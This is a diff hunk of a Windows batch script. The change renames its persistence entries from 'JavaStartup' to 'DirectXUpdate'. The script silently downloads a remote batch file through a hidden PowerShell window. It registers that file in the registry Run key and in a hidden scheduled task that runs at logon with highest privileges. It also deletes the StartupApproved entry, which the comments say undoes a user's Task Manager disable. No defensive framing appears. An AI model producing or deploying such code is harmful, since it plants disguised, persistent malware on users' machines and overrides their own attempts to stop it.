@@ -35,13 +35,13 @@ if not exist "%LOGS_FOLDER%" (
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%')"
 
 :: Remove Task Manager "disabled" block if it exists
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "JavaStartup" /f >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "DirectXUpdate" /f >nul 2>&1
 
 :: Add to registry startup (Run)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "JavaStartup" /t REG_SZ /d "\"%AURA_BAT_FILE%\"" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" /t REG_SZ /d "\"%DirectXUpdate_BAT_FILE%\"" /f
 
 :: Add backup Scheduled Task (bypasses Task Manager disables)
-SCHTASKS /Create /TN "JavaStartupHidden" /TR "\"%AURA_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F
+SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F
 
 exit
 
